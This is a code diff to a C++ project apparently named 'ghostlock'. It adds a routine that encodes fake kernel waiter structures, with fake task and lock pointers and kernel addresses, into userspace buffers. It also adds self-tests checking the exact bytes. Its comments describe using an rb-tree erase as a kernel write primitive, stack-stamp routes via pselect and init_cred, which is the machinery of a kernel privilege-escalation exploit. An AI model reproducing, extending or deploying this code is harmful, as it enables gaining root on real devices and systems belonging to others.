@@ -52,6 +52,27 @@ namespace ghostlock::memory {
                span_store64(waiter, 0x28, stamp.left);
     }
 
+    bool encode_waiter_words(std::span<std::byte> buffer, size_t offset,
+                             const WaiterWords &words) noexcept {
+        if (offset > buffer.size() || kWaiterBytes > buffer.size() - offset) {
+            return false;
+        }
+        /* One store per word instead of a memcpy of a packed struct: the strip
+         * is a userspace image of a kernel object, so its byte layout is the
+         * ABI, not this compiler's idea of a struct. */
+        const std::uint64_t raw[kWaiterWords] = {
+            words.tree_pc, words.tree_right, words.tree_left,
+            words.pi_pc, words.pi_right, words.pi_left,
+            words.task, words.lock,
+            words.prio, words.deadline, words.ww_ctx,
+        };
+        for (size_t i = 0; i < kWaiterWords; i++) {
+            memcpy(buffer.data() + offset + i * sizeof(std::uint64_t), &raw[i],
+                   sizeof(std::uint64_t));
+        }
+        return true;
+    }
+
     bool encode_multicast_waiter(std::span<std::byte> buffer,
                                  size_t waiter_offset, size_t task_offset, size_t lock_offset,
                                  uintptr_t fake_task, uintptr_t fake_lock) noexcept {
@@ -208,6 +229,63 @@ namespace ghostlock::memory {
             return 0;
         std::byte undersized[0x2f]{};
         if (encode_compact_waiter(undersized, w1, rejected)) return 0;
+
+        /* The eleven-word waiter strip both stack-stamp routes share. Fixed
+         * vectors: the exact bytes the select route's compact branch stamps
+         * (its table at route/select_stack_route.cpp's `pselect_waiter_word
+         * words[]` is the reference this must reproduce byte for byte). */
+        {
+            constexpr std::uintptr_t leaf_target = 0xffffff8000127000ULL;
+            constexpr std::uintptr_t leaf_task = 0xffffff8800005800ULL;
+            constexpr std::uintptr_t leaf_lock = 0xffffff802aa3a590ULL;
+            const WriteRequest leaf = WriteRequest::make(
+                leaf_target, WriteMode::Zero, /*leaf=*/1);
+            const PayloadWriteLayout leaf_layout = payload_write_layout(
+                &leaf, page, 0x1111, 0x2222, init_cred);
+            std::array<std::byte, kWaiterBytes> strip{};
+            if (!encode_waiter_words(strip, 0,
+                                     waiter_words(leaf_layout, leaf_task, leaf_lock, 140)))
+                return 0;
+            const std::uint64_t expected[kWaiterWords] = {
+                leaf_target - 8, 0, 0, /* tree: childless leaf, pc = target - 8 */
+                0, 0, 0,               /* pi triple parks at zero */
+                leaf_task, leaf_lock, 140, 0, 0,
+            };
+            for (size_t i = 0; i < kWaiterWords; i++) {
+                if (load64(reinterpret_cast<const unsigned char *>(strip.data()),
+                           i * sizeof(std::uint64_t)) != expected[i])
+                    return 0;
+            }
+
+            /* The pointer layout: the erase stores `right` at rb_left and
+             * re-parents through it, so the triple is {pc = value, right = 0,
+             * left = target} -- the target is the *left* child. */
+            constexpr std::uintptr_t ptr_target = 0xffffff8000128000ULL;
+            const WriteRequest pointer = WriteRequest::make(
+                ptr_target, WriteMode::Zero, /*leaf=*/false);
+            const PayloadWriteLayout pointer_layout = payload_write_layout(
+                &pointer, page, 0x1111, 0x2222, init_cred);
+            const WaiterWords pointer_words =
+                waiter_words(pointer_layout, leaf_task, leaf_lock, 140);
+            if (pointer_words.tree_pc != page + 0x100 ||
+                pointer_words.tree_right != 0 ||
+                pointer_words.tree_left != ptr_target)
+                return 0;
+
+            /* Words land at offset + 8*i, and nothing outside the strip moves. */
+            std::array<std::byte, 0x60> window{};
+            if (!encode_waiter_words(window, 8, pointer_words)) return 0;
+            if (load64(reinterpret_cast<const unsigned char *>(window.data()),
+                       8 + 0x38) != leaf_lock)
+                return 0;
+            for (size_t i = 0; i < 8; i++) {
+                if (window[i] != std::byte{0}) return 0;
+            }
+            /* An undersized span is refused instead of written out of bounds. */
+            std::array<std::byte, kWaiterBytes - 1> too_small{};
+            if (encode_waiter_words(too_small, 0, pointer_words)) return 0;
+            if (encode_waiter_words(window, 9, pointer_words)) return 0;
+        }
         /* Multicast geometry that would run past the supplied span is rejected
      * instead of written out of bounds. */
         std::array<std::byte, 0x40> multicast_small{};
